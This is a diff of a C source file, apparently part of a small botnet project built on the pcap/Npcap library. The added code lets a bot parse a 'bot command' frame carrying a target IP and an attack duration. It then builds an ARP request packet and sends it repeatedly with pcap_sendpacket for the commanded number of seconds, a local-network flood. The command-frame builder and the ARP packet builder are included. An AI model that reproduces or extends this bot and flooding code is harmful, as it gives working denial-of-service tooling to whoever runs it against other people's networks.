@@ -1,10 +1,13 @@
 #include "utils.h"
 #include <string.h>
 #include <stdlib.h>
+#include "constants.h"
+#include <time.h>
+
+#define NPCAP_ERROR printf("NPCAP error message: \"%s\"\n", errbuff);
 
 
-
-_Bool is_adapter_availiable(const char* adapter)
+_Bool is_adapter_availiable(const char* adapter, pcap_if_t* device)
 {
     pcap_if_t* node = NULL;
 
@@ -18,14 +21,18 @@ _Bool is_adapter_availiable(const char* adapter)
 
         
     pcap_if_t* ptr = node;
+    //pcap_if_t* prev = node;
     while(ptr)
     {
         if(!strcmp(ptr->name, adapter))
         {
+            //prev->next = ptr->next;
+            *device = *ptr;
             pcap_freealldevs(node);
             return true;
         }  
         
+        //prev = ptr;
         ptr = ptr->next;
     }
 
@@ -78,11 +85,6 @@ _Bool is_bot_command(const u_char *package)
 
 void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes)
 {
-    //printf("Packet arrived at %ld with data:\n", h->ts.tv_sec);
-    //for(int i=0; i<h->caplen; i++)
-    //    printf("%x ", bytes[i]);
-    //printf("\n\n");
-
     if(is_bot_command(bytes))
     {
         u_char target_ip[4];
@@ -100,10 +102,22 @@ void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *byt
             *((u_char*)(&sec) + 3-i) = attack_time[i];
         }
         printf("for %d seconds\n", sec);
+
+        u_char arp_package[42];
+        create_arp_attack(target_ip, bot_node_mac, bot_node_ip, arp_package);
+        
+        time_t start = time(NULL);
+        time_t end = time(NULL);
+        while((end-start)!=sec)
+        {
+            printf("time passed: %d\n", end-start);
+            pcap_sendpacket((pcap_t*)user, arp_package, 42);
+            end = time(NULL);
+        }
     }
 }
 
-void create_bot_command(const u_char ip[4], int attack_time, u_char* package)
+void create_bot_command(const u_char target_ip[4], int attack_time, u_char* package)
 {
     // broadcast destination
     for(int i=0; i<6; i++)
@@ -111,16 +125,14 @@ void create_bot_command(const u_char ip[4], int attack_time, u_char* package)
     
     //source address
     for(int i=6; i<12; i++)
-    {
         package[i] = bot_master_mac[i-6];
-    }
 
     //ethertype
     package[12] = *((u_char*)(&bot_ethertype) + 1);
     package[13] = *((u_char*)(&bot_ethertype) + 0);
     
     //target ip
-    memcpy(package + 14, ip, 4);
+    memcpy(package + 14, target_ip, 4);
     
     //attack time
     for(int i=0; i<4; i++)
@@ -132,5 +144,56 @@ void create_bot_command(const u_char ip[4], int attack_time, u_char* package)
     
     // FCS calculation
     // todo
+}
 
+void create_arp_attack(const u_char target_ip[4], const u_char sha[6], const u_char spa[4], u_char* package)
+{
+    // broadcast destination
+    for(int i=0; i<6; i++)
+        package[i] = broadcast_mac[i];
+    
+    //source address
+    for(int i=6; i<12; i++)
+        package[i] = sha[i-6];
+    
+    // arp ethertype 0x0806
+    package[12] = 8;
+    package[13] = 6;
+
+    // Ethernet htype 0x0001
+    package[14] = 0;
+    package[15] = 1;
+
+    // IPv4 ptype 0x0800
+    package[16] = 8;
+    package[17] = 0;
+
+    // hsize
+    package[18] = 6;
+
+    // psize
+    package[19] = 4;
+
+    // Opcode=1 - request
+    package[20] = 0;
+    package[21] = 1;
+
+    // sha - sender MAC
+    for(int i=22; i<28; i++)
+        package[i] = sha[i-22];
+    
+    // spa - sender IP
+    for(int i=28; i<32; i++)
+        package[i] = spa[i-28];
+    
+    // tha - target MAC(unknown)
+    for(int i=32; i<38; i++)
+        package[i] = 0;
+    
+    // tpa - target IP
+    for(int i=38; i<42; i++)
+        package[i] = target_ip[i-38];
+    
+    // FCS calculation
+    // todo
 }
